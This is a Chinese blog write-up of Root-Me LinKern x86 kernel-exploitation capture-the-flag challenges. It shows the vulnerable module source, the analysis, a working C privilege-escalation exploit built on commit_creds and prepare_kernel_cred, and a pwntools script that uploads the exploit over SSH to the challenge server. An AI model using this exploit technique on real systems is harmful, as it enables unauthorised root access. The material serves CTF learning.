<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">scp -P 2223 app-systeme-ch1@challenge03.root-me.org://challenge/app-systeme/ch1/* .</span><br><span class="line">scp -P 2223 ./poc.c app-systeme-ch1@challenge03.root-me.org://challenge/app-systeme/ch1/</span><br><span class="line"><span class="comment">#password:app-systeme-ch1</span></span><br></pre></td></tr></table></figure>
<h4 id="分析init"><a href="#分析init" class="headerlink" title="分析init"></a>分析init</h4><ol>
<li>解压</li>
<li>cat init</li>
</ol>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~/linkern/initramfs$ cat init</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"> </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">//提示flag在passwd，并且挂载到了/dev/sda</span><br><span class="line">mkdir -p /passwd</span><br><span class="line">mount -t ext2 -o ro /dev/sda /passwd</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># share</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">mkdir -p /mnt/share</span><br><span class="line">mount -t 9p -o trans=virtio rootme /mnt/share/ -oversion=9p2000.L,posixacl,sync</span><br><span class="line">chmod 777 /mnt/share/</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># module</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">//lkms加载到了/lib/modules/*/rootme/*.ko</span><br><span class="line">insmod /lib/modules/*/rootme/*.ko</span><br><span class="line">chmod 666 /dev/tostring </span><br><span class="line"><span class="comment"># mmap_min_addr to 0 for the challenge to be simpler for now ;)</span></span><br><span class="line">echo 0 &gt; /proc/sys/vm/mmap_min_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># shell</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">cat /etc/issue</span><br><span class="line">export ENV=/etc/profile</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"> </span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">umount /dev</span><br><span class="line"> </span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
<ul>
<li>11、12行提示flag在passwd，并且挂载到了/dev/sda</li>
<li>25行中，需要分析的LKMs被加载到了<code>/lib/modules/*/rootme/*.ko</code></li>
</ul>
<h4 id="分析LKMs文件"><a href="#分析LKMs文件" class="headerlink" title="分析LKMs文件"></a>分析LKMs文件</h4><p>进入<code>/lib/modules/*/rootme/*.ko</code>，找到LKMs文件</p>
<p><img src="/2021/06/05/20-29/image-20210603143340595.png" alt="image-20210603143340595"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~/linkern/initramfs/lib/modules/4.10.3/rootme$ file tostring.ko </span><br><span class="line">tostring.ko: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), BuildID[sha1]=de2b579770a3ff522ee27200d85cb2bc1723ef22, not stripped</span><br><span class="line">winter@ubuntu:~/linkern/initramfs/lib/modules/4.10.3/rootme$ checksec tostring.ko </span><br><span class="line">[*] '/home/winter/linkern/initramfs/lib/modules/4.10.3/rootme/tostring.ko'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>
<p>（一般情况）加载到ida中分析，不过本程序给了源码，可以直接分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/version.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kdev_t.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">dev_t</span> first; <span class="comment">// Global variable for the first device number</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">c_dev</span>;</span> <span class="comment">// Global variable for the character device structure</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">class</span> *<span class="title">cl</span>;</span> <span class="comment">// Global variable for the device class</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tostring_s</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> pointer;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> tostring_stack[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">ssize_t</span> (*tostring_read)(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">tostring_s</span> <span class="title">tostring</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">tostring_open</span><span class="params">(struct inode *i, struct file *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring: open()\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">tostring_close</span><span class="params">(struct inode *i, struct file *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring: close()\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_read</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring: read()\n"</span>);</span><br><span class="line">    <span class="keyword">return</span>(tostring.tostring_read)(f, buf, len, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_read_hexa</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring: read_hexa()\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (tostring.pointer &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>(<span class="built_in">snprintf</span>(buf,len,<span class="string">"%16llx\n"</span>,tostring.tostring_stack[--tostring.pointer]));</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_read_dec</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring: read_dec()\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (tostring.pointer &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>(<span class="built_in">snprintf</span>(buf,len,<span class="string">"%lld\n"</span>,tostring.tostring_stack[--tostring.pointer]));</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_write</span><span class="params">(struct file *f, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf,<span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *bufk;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring: write()\n"</span>);</span><br><span class="line">    <span class="comment">// rajout du 0 final</span></span><br><span class="line"></span><br><span class="line">    bufk = kmalloc(len + <span class="number">1</span>, GFP_DMA);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bufk)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(bufk, buf, len))</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">        bufk[len] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bufk[<span class="number">0</span>]==<span class="string">'M'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bufk[<span class="number">1</span>]==<span class="string">'H'</span>) tostring.tostring_read= tostring_read_hexa;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (bufk[<span class="number">1</span>]==<span class="string">'D'</span>) tostring.tostring_read= tostring_read_dec;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            printk(<span class="string">"tostring: insertion %d\n"</span>,*((<span class="keyword">int</span> *) bufk));</span><br><span class="line">            tostring.tostring_stack[tostring.pointer++]= *((<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *) bufk);;      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    kfree(bufk);</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pugs_fops</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    .owner = THIS_MODULE,</span><br><span class="line">    .<span class="built_in">open</span> = tostring_open,</span><br><span class="line">    .<span class="built_in">release</span> = tostring_close,</span><br><span class="line">    .<span class="built_in">read</span> = tostring_read,</span><br><span class="line">    .<span class="built_in">write</span> = tostring_write</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">tostring_init</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">/* Constructor */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring registered"</span>);</span><br><span class="line">    tostring.pointer=<span class="number">0</span>;</span><br><span class="line">    tostring.tostring_read= tostring_read_hexa;</span><br><span class="line">    <span class="keyword">if</span> (alloc_chrdev_region(&amp;first, <span class="number">0</span>, <span class="number">1</span>, <span class="string">"tostring"</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((cl = class_create(THIS_MODULE, <span class="string">"chardrv"</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (device_create(cl, <span class="literal">NULL</span>, first, <span class="literal">NULL</span>, <span class="string">"tostring"</span>) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">"Tostring error"</span>);</span><br><span class="line">        class_destroy(cl);</span><br><span class="line">        unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cdev_init(&amp;c_dev, &amp;pugs_fops);</span><br><span class="line">    <span class="keyword">if</span> (cdev_add(&amp;c_dev, first, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        device_destroy(cl, first);</span><br><span class="line">        class_destroy(cl);</span><br><span class="line">        unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">"&lt;Major, Minor&gt;: &lt;%d, %d&gt;\n"</span>, MAJOR(first), MINOR(first));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">tostring_exit</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">/* Destructor */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    unregister_chrdev_region(first, <span class="number">3</span>);</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring unregistered"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(tostring_init);</span><br><span class="line">module_exit(tostring_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"F.Boisson"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"Module Tostring Integers Dec/Hex"</span>);</span><br></pre></td></tr></table></figure>
<p>重点分析read和write函数</p>
<h5 id="read"><a href="#read" class="headerlink" title="read"></a>read</h5><ul>
<li><p>打印字符串<code>Tostring: read()\n</code></p>
</li>
<li><p>调用了0x8000984，参数是输入的数据</p>
<p><img src="/2021/06/05/20-29/image-20210603145537156.png" alt="image-20210603145537156"></p>
<p>0x8000984在bss段上，且上面有一个0x8000784、0x8000788</p>
<p><img src="/2021/06/05/20-29/image-20210603145615870.png" alt="image-20210603145615870"></p>
<p><img src="/2021/06/05/20-29/image-20210603145652475.png" alt="image-20210603145652475"></p>
</li>
</ul>
<h5 id="write"><a href="#write" class="headerlink" title="write"></a>write</h5><ul>
<li><p>打印字符串<code>Tostring: write()\n</code></p>
</li>
<li><p>申请一块空间 =&gt; <code>bufk = kmalloc(len + 1, GFP_DMA)</code></p>
</li>
<li><p>将write函数的数据写入申请的chunk中 =&gt; <code>copy_from_user(bufk, buf, len)</code></p>
</li>
<li><p>将输入的数据拷贝到栈上 =&gt; <code>tostring.tostring_stack[tostring.pointer++]= *((long long int *) bufk);</code></p>
<ul>
<li>一次拷贝long long int，也就是八字节</li>
<li>拷贝的地址是0x8000784</li>
</ul>
<p><img src="/2021/06/05/20-29/image-20210603150742793.png" alt="image-20210603150742793"></p>
</li>
<li><p>释放，结束</p>
</li>
</ul>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
<li>程序write时候，将数据拷贝到栈上0x8000784</li>
<li>执行read函数，会执行栈上的地址0x8000984</li>
<li>所以，如果一直执行write函数，覆盖到0x8000984地址为shellcode，就可以get shell</li>
<li>距离是0x200，因为一次只能写八字节，需要循环写40次</li>
<li>然后将0x8000984地址覆盖成shellcode</li>
<li>调用read函数</li>
</ol>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> receive[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"pushl %cs;popl tf+4;"</span>    <span class="comment">//set cs</span></span><br><span class="line">        <span class="string">"pushfl;popl tf+8;"</span>       <span class="comment">//set eflags</span></span><br><span class="line">        <span class="string">"pushl %esp;popl tf+12;"</span></span><br><span class="line">        <span class="string">"pushl %ss;popl tf+16;"</span>);</span><br><span class="line">    tf.eip = &amp;get_shell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xC10711F0</span>;</span><br><span class="line"><span class="keyword">void</span>* (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xC1070E80</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov $tf,%esp;"</span></span><br><span class="line">          <span class="string">"iret;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Padding[<span class="number">9</span>] = <span class="string">"AAAAAAAA"</span>;			<span class="comment">//一次覆盖8字节</span></span><br><span class="line">    <span class="keyword">char</span> Eip[<span class="number">5</span>];							<span class="comment">//shellcode地址</span></span><br><span class="line">    init_tf_work();							<span class="comment">//初始化</span></span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/tostring"</span>,<span class="number">2</span>);		<span class="comment">//使用该驱动</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x40</span>; i++)			<span class="comment">//覆盖前面0x200的垃圾数据</span></span><br><span class="line">        <span class="built_in">write</span>(fd,Padding,<span class="keyword">sizeof</span>(Padding));	</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>,<span class="string">"OK!n"</span>,<span class="keyword">sizeof</span>(Eip));			<span class="comment">//友好提示</span></span><br><span class="line">    *((<span class="keyword">void</span>**)(Eip)) = &amp;payload;			<span class="comment">//将shellocde地址写入eip</span></span><br><span class="line">    <span class="built_in">write</span>(fd,Eip,<span class="keyword">sizeof</span>(Eip));				<span class="comment">//将eip写入0x80000984</span></span><br><span class="line">    <span class="built_in">read</span>(fd,receive,<span class="number">255</span>);					<span class="comment">//执行read函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="调试信息"><a href="#调试信息" class="headerlink" title="调试信息"></a>调试信息</h5><ul>
<li>ida中bss段的起始地址是0x8000780</li>
<li>程序执行的data段起始地址是0xc8824600</li>
</ul>
<p>所以，拷贝的起始地址0x8000780在调试的时候就是0xc8824604</p>
<hr>
<p>执行一次write</p>
<p><img src="/2021/06/05/20-29/image-20210603152453197.png" alt="image-20210603152453197"></p>
<p>执行完40次write，再执行 write(fd,Eip,sizeof(Eip));【也就是将shellcode地址写入了0xc8824804这个地址】</p>
<p><img src="/2021/06/05/20-29/image-20210603152841301.png" alt="image-20210603152841301"></p>
<h4 id="question"><a href="#question" class="headerlink" title="question"></a>question</h4><blockquote>
<p>远程提权失败，也不知道为什么，，，权限是变了，但是变得很奇怪。。。</p>
<p><img src="/2021/06/05/20-29/image-20210604143845221.png" alt="image-20210604143845221"></p>
<p>本地ok</p>
<p><img src="/2021/06/05/20-29/image-20210604143951129.png" alt="image-20210604143951129"></p>
<p><img src="/2021/06/05/20-29/image-20210604144004010.png" alt="image-20210604144004010"></p>
</blockquote>
<h5 id="上传脚本"><a href="#上传脚本" class="headerlink" title="上传脚本"></a>上传脚本</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.update(log_level='debug')</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"challenge03.root-me.org"</span></span><br><span class="line">PORT =  <span class="number">2223</span></span><br><span class="line"></span><br><span class="line">USER = <span class="string">"app-systeme-ch1"</span></span><br><span class="line">PW = <span class="string">"app-systeme-ch1"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compile</span><span class="params">()</span>:</span></span><br><span class="line">    log.info(<span class="string">"Compile"</span>)</span><br><span class="line">    <span class="comment"># os.system("musl-gcc -w -s -static -o3 oob.c -o exp")</span></span><br><span class="line">    os.system(<span class="string">"gcc -m32 -static -o exp poc.c"</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    r.sendline(cmd)</span><br><span class="line">    r.recvuntil(<span class="string">"$ "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    p = log.progress(<span class="string">"Upload"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"exp"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">"$ "</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(encoded), <span class="number">300</span>):</span><br><span class="line">        p.status(<span class="string">"%d / %d"</span> % (i, len(encoded)))</span><br><span class="line">        exec_cmd(<span class="string">"echo \"%s\" &gt;&gt; benc"</span> % (encoded[i:i+<span class="number">300</span>]))</span><br><span class="line"></span><br><span class="line">    exec_cmd(<span class="string">"cat benc | base64 -d &gt; bout"</span>)</span><br><span class="line">    exec_cmd(<span class="string">"chmod +x bout"</span>)</span><br><span class="line">    exec_cmd(<span class="string">"./bout"</span>)</span><br><span class="line"></span><br><span class="line">    p.success()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    compile()</span><br><span class="line">    upload()</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        session = ssh(USER, HOST, PORT, PW)</span><br><span class="line">        r = session.run(<span class="string">"/bin/sh"</span>)</span><br><span class="line">        exploit(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = process(<span class="string">"./startvm.sh"</span>)</span><br><span class="line">        <span class="keyword">print</span> util.proc.pidof(r)</span><br><span class="line">        pause()</span><br><span class="line">        exploit(r)</span><br></pre></td></tr></table></figure>
<h5 id="musl-gcc编译32位"><a href="#musl-gcc编译32位" class="headerlink" title="musl-gcc编译32位"></a>musl-gcc编译32位</h5><ul>
<li><p>gcc编译的，没用musl-gcc</p>
</li>
<li><p>musl-gcc怎么编译32位的？没有-m32参数</p>
</li>
</ul>
<h3 id="2-Root-Me-LinKern-x86-Null-pointer-dereference"><a href="#2-Root-Me-LinKern-x86-Null-pointer-dereference" class="headerlink" title="2.[Root-Me]LinKern x86 - Null pointer dereference"></a>2.[Root-Me]LinKern x86 - Null pointer dereference</h3><h4 id="下载文件-1"><a href="#下载文件-1" class="headerlink" title="下载文件"></a>下载文件</h4><p><a href="https://www.root-me.org/en/Challenges/App-System/LinKern32-Null-pointer-dereference" target="_blank" rel="noopener">下载地址</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh -p 2223 app-systeme-ch2@challenge03.root-me.org</span><br><span class="line">密码:app-systeme-ch2</span><br></pre></td></tr></table></figure>
<p>拷贝文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp -P 2223 app-systeme-ch2@challenge03.root-me.org:/challenge/app-systeme/ch2/* .</span><br><span class="line">密码:app-systeme-ch2</span><br></pre></td></tr></table></figure>
<h4 id="分析init文件"><a href="#分析init文件" class="headerlink" title="分析init文件"></a>分析init文件</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"> </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">mkdir -p /passwd</span><br><span class="line">mount -t ext2 -o ro /dev/sda /passwd</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># share</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">mkdir -p /mnt/share</span><br><span class="line">mount -t 9p -o trans=virtio rootme /mnt/share/ -oversion=9p2000.L,posixacl,sync</span><br><span class="line">chmod 777 /mnt/share/</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># module</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">insmod /lib/modules/*/rootme/*.ko</span><br><span class="line">chmod 666 /dev/tostring </span><br><span class="line"><span class="comment"># mmap_min_addr to 0 for the challenge to be simpler for now ;)</span></span><br><span class="line">echo 0 &gt; /proc/sys/vm/mmap_min_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># shell</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">cat /etc/issue</span><br><span class="line">export ENV=/etc/profile</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"> </span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">umount /dev</span><br><span class="line"> </span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
<p>和上一题的init差不多</p>
<h4 id="分析LKMs文件-1"><a href="#分析LKMs文件-1" class="headerlink" title="分析LKMs文件"></a>分析LKMs文件</h4><p>路径由init可知：<code>/lib/modules/*/rootme/*.ko</code></p>
<p><img src="/2021/06/05/20-29/image-20210603220411473.png" alt="image-20210603220411473"></p>
